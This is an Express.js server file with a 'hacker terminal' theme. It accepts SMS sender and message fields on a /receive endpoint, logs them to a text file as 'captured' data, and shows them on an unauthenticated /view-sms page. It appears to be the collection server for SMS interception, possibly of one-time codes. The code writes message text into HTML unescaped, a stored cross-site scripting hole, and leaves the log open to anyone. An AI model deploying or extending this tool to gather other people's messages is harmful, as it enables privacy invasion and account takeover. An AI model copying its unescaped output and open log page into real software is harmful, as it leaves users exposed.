const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// 1. Home Page - Hacker Entry
app.get('/', (req, res) => {
    res.send(`
        <body style="background:#000; color:#0f0; font-family:monospace; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;">
            <h1 style="border-right: 2px solid #0f0; white-space: nowrap; overflow: hidden; animation: typing 2s steps(30, end);">[ SYSTEM ONLINE: SMS_RECEIVER_V1 ]</h1>
            <p>ACCESS GRANTED. GO TO <a href="/view-sms" style="color:#fff;">/view-sms</a> TO DECRYPT DATA.</p>
            <style>
                @keyframes typing { from { width: 0 } to { width: 100% } }
            </style>
        </body>
    `);
});

// 2. Receive SMS - Data Logger
app.post('/receive', (req, res) => {
    const { sender, message } = req.body;
    if (sender && message) {
        // Data ko comma-separated format mein save kar rahe hain taaki table mein dikha sakein
        const timestamp = new Date().toLocaleString();
        const logEntry = `${timestamp}||${sender}||${message}\n`;
        
        fs.appendFile('sms_logs.txt', logEntry, (err) => {
            if (err) return res.status(500).send("IO_ERROR");
            console.log(`[+] Captured: ${sender}`);
            res.status(200).send("ENCRYPTED_AND_SAVED");
        });
    } else {
        res.status(400).send("INVALID_PAYLOAD");
    }
});

// 3. View SMS - Hacker Terminal UI
app.get('/view-sms', (req, res) => {
    fs.readFile('sms_logs.txt', 'utf8', (err, data) => {
        let rows = "";
        if (!err) {
            const lines = data.trim().split('\n');
            lines.reverse().forEach(line => {
                const [time, from, msg] = line.split('||');
                rows += `
                    <tr style="border-bottom: 1px solid #030;">
                        <td style="padding:10px; color:#888;">${time}</td>
                        <td style="padding:10px; color:#0f0; font-weight:bold;">${from}</td>
                        <td style="padding:10px; color:#0a0;">${msg}</td>
                    </tr>`;
            });
        }

        res.send(`
        <body style="background:#050505; color:#0f0; font-family:'Courier New', monospace; padding:20px;">
            <h2 style="text-shadow: 0 0 10px #0f0;">> TERMINAL_SMS_LOGS:</h2>
            <hr style="border:1px solid #0f0;">
            <table style="width:100%; border-collapse: collapse; margin-top:20px;">
                <thead>
                    <tr style="background:#0a0; color:#000; text-align:left;">
                        <th style="padding:10px;">TIMESTAMP</th>
                        <th style="padding:10px;">SOURCE_ID</th>
                        <th style="padding:10px;">MESSAGE_PAYLOAD</th>
                    </tr>
                </thead>
                <tbody>
                    ${rows || '<tr><td colspan="3" style="text-align:center; padding:20px;">NO DATA INTERCEPTED YET...</td></tr>'}
                </tbody>
            </table>
            <br>
            <button onclick="location.reload()" style="background:#0f0; color:#000; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">[ REFRESH_LOGS ]</button>
            <p style="font-size:12px; color:#050; margin-top:50px;">C:\SYSTEM\DECRYPTOR> _waiting_for_new_data...</p>
        </body>
        `);
    });
});

app.listen(PORT, () => console.log(`[!] Hacker Server Live on Port ${PORT}`));